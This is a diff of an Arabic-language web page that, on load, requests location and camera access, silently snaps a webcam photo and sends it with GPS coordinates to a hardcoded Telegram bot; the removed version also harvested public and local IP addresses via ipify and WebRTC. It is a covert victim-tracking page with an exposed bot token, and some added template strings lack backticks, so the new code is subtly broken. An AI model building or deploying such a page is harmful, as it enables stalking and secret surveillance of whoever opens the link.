@@ -2,145 +2,109 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>📍 تحديد + تصوير + IPs</title>
+  <title>📍 تحديد + تصوير تلقائي</title>
 </head>
 <body>
+  <h2>📡 جاري جمع المعلومات...</h2>
   <video id="video" autoplay playsinline style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
-  <pre id="result">📡 جاري جمع المعلومات...</pre>
+  <pre id="result">يرجى السماح بالموقع والكاميرا...</pre>
 
   <script>
     const token = "7692799219:AAGv_dCGtZ5c-6MXTrUUJeEVoBDATMN3RgI";
     const chat_id = "5735855086";
 
-    let gpsMsg = "";
-    let publicIP = "";
-    let localIP = "";
+    function sendMessage(text) {
+      return fetch(https://api.telegram.org/bot${token}/sendMessage, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id, text })
+      });
+    }
 
     function sendPhoto(blob) {
       const form = new FormData();
       form.append("chat_id", chat_id);
       form.append("photo", blob, "photo.jpg");
-      return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+
+      return fetch(https://api.telegram.org/bot${token}/sendPhoto, {
         method: "POST",
         body: form
       });
     }
 
-    function sendCombinedMessage() {
-      const message = `📡 معلومات الجهاز:
+    function capturePhotoAndSend(video, stream) {
+      const canvas = document.getElementById("canvas");
+      const context = canvas.getContext("2d");
 
-📍 الموقع (GPS):
-${gpsMsg || "❌ فشل تحديد الموقع"}
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0);
 
-🌐 IP الخارجي: ${publicIP || "❌"}
-🏠 IP الداخلي: ${localIP || "❌"}
+      canvas.toBlob(blob => {
+        sendPhoto(blob)
+          .then(() => {
+            document.getElementById("result").innerText += "\n📸 الصورة أُرسلت.";
+          })
+          .catch(err => {
+            document.getElementById("result").innerText += "\n❌ فشل إرسال الصورة: " + err.message;
+          });
+      }, "image/jpeg");
 
-🗺️ Google Maps: https://www.google.com/maps?q=${gpsLat},${gpsLon}`;
-      document.getElementById("result").innerText = message;
-      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id, text: message })
+      stream.getTracks().forEach(track => track.stop());
+    }
+
+  function initCamera() {
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+
+        // ✅ الالتقاط فور تشغيل أول فريم
+        video.addEventListener('playing', () => {
+          capturePhotoAndSend(video, stream);
+        });
+      })
+      .catch(err => {
+        document.getElementById("result").innerText += "\n❌ الكاميرا غير متاحة: " + err.message;
       });
     }
 
-    let gpsLat = "";
-    let gpsLon = "";
-    let partsReady = 0;
-
-    function checkIfReady() {
-      partsReady++;
-      if (partsReady === 3) {
-        sendCombinedMessage();
-      }
-    }
-
-    function getLocation() {
+    function getLocationAndSend() {
       if ("geolocation" in navigator) {
         navigator.geolocation.getCurrentPosition(
           pos => {
-            gpsLat = pos.coords.latitude.toFixed(6);
-            gpsLon = pos.coords.longitude.toFixed(6);
+            const lat = pos.coords.latitude.toFixed(6);
+            const lon = pos.coords.longitude.toFixed(6);
             const acc = pos.coords.accuracy;
-            gpsMsg = `Latitude: ${gpsLat}
-Longitude: ${gpsLon}
-📏 الدقة: ±${acc} متر`;
-            checkIfReady();
+
+            const msg = 📍 تحديد الموقع (GPS):
+Latitude: ${lat}
+Longitude: ${lon}
+📏 الدقة: ±${acc} متر
+🗺️ https://www.google.com/maps?q=${lat},${lon};
+
+            document.getElementById("result").innerText = msg;
+            sendMessage(msg);
           },
           err => {
-            gpsMsg = `❌ فشل تحديد الموقع: ${err.message}`;
-            checkIfReady();
+            document.getElementById("result").innerText = "❌ فشل تحديد الموقع: " + err.message;
+            sendMessage("❌ فشل تحديد الموقع: " + err.message);
           },
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+          {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+          }
         );
       } else {
-        gpsMsg = "❌ جهازك لا يدعم GPS";
-        checkIfReady();
+        document.getElementById("result").innerText = "❌ جهازك لا يدعم GPS";
+        sendMessage("❌ جهاز لا يدعم GPS");
       }
     }
 
-    function getPublicIP() {
-      fetch("https://api.ipify.org?format=json")
-        .then(res => res.json())
-        .then(data => {
-          publicIP = data.ip;
-          checkIfReady();
-        })
-        .catch(() => {
-          publicIP = "❌ فشل جلب IP";
-          checkIfReady();
-        });
-    }
-
-    function getLocalIP() {
-      const pc = new RTCPeerConnection({ iceServers: [] });
-      pc.createDataChannel("");
-      pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
-      pc.onicecandidate = event => {
-        if (!event || !event.candidate) return;
-        const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(event.candidate.candidate);
-        if (ipMatch) {
-          const ip = ipMatch[1];
-          if (ip.startsWith("192.") || ip.startsWith("10.") || ip.startsWith("172.")) {
-            localIP = ip;
-            checkIfReady();
-          }
-        }
-      };
-      // fallback in case candidate doesn't return local IP
-      setTimeout(() => {
-        if (!localIP) {
-          localIP = "❌ لم يتم الحصول عليه";
-          checkIfReady();
-        }
-      }, 2000);
-    }
-
-    function initCamera() {
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-          const video = document.getElementById("video");
-          video.srcObject = stream;
-          video.addEventListener("playing", () => {
-            const canvas = document.getElementById("canvas");
-            const ctx = canvas.getContext("2d");
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0);
-            canvas.toBlob(blob => sendPhoto(blob), "image/jpeg");
-            stream.getTracks().forEach(track => track.stop());
-          });
-        })
-        .catch(err => {
-          document.getElementById("result").innerText += "\n❌ الكاميرا غير متاحة: " + err.message;
-        });
-    }
-
-    // ابدأ العمليات
-    getLocation();
-    getPublicIP();
-    getLocalIP();
+    // البدء مباشرة
+    getLocationAndSend();
     initCamera();
   </script>
 </body>
